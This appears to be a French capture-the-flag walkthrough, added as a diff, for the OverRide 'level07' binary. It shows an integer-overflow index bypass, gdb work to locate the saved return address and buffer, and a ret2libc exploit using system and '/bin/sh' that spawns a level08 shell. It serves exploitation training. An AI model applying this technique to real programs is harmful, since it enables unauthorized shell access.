@@ -1,0 +1,137 @@
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+  wil has reserved some storage :>
+----------------------------------------------------
+Input command: store
+Number: -2
+Index: 1
+Completed store command successfully
+Input command: read
+Index: -2
+Number at data[4294967294] is 4294957016
+Completed read command successfully
+
+
+On peut donc en conclure que 
+  data[4294967296] == data[0]
+
+Comme on stock des int dans un array, notre entrée va donc être divisé par 4.
+
+4294967296 / 4 = 1073741824
+
+Input command: store
+  Number: 42
+  Index: 1073741824
+  Completed store command successfully
+Input command: read
+  Index: 0
+  Number at data[0] is 42
+  Completed read command successfully
+
+Ca fonctionne, on arrive à écrire sur l'index 0
+
+
+On va essayer de voir si on peut faire un bufferoverflow, pour cela on a besoin de trouver un offset:
+Pour cela on commence par trouver l'EIP.
+
+(gdb) b main
+Breakpoint 1 at 0x8048729
+(gdb) r
+Starting program: /home/users/level07/level07
+
+Breakpoint 1, 0x08048729 in main ()
+(gdb) i f
+Stack level 0, frame at 0xffffd710:
+ eip = 0x8048729 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args:
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebp at 0xffffd708, eip at 0xffffd70c
+
+0xffffd70c est l'adresse de notre EIP
+
+
+Maintenant on a besoin de trouver l'adresse du buffer:
+Pour cela on s'interesse a la fonction read_number, qui va read sur le buffer.
+
+(gdb) disas read_number
+  ...
+  0x080486ff <+40>:    add    0x8(%ebp),%eax
+  ...
+(gdb) b read_number
+Breakpoint 1 at 0x80486dd
+(gdb) r
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: read
+
+Breakpoint 1, 0x080486dd in read_number ()
+(gdb) x/x 0x8+$ebp
+0xffffd520:     0xffffd544
+
+0xffffd544 est l'adresse de notre buffer.
+
+On a donc:
+offset = 0xffffd70c - 0xffffd554 = 456/4 = 114
+
+
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+system address: 0xf7e6aed0
+
+(gdb) find &system,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+/bin/sh address: 0xf7f897ec
+
+On peut donc utiliser system et /bin/sh et faire une ret2libc
+
+
+On peut donc commencer à écrire notre exploit.
+Pour écrire 114 dans le tableau, comme s'est un multiple de 3, on va devoir utiliser le fait que
+4294967296 = 0
+
+On a donc 
+114 == (4294967296 / 4) + 114 == 1073741938
+
+on peut donc écrire:
+system -> 0xf7e6aed0 == 4159090384 -> 114 == 1073741938
+/bin/sh -> 0xf7f897ec == 4160264172 -> 116 == 116
+
+On peut donc commencer à écrire dans le buffer:
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
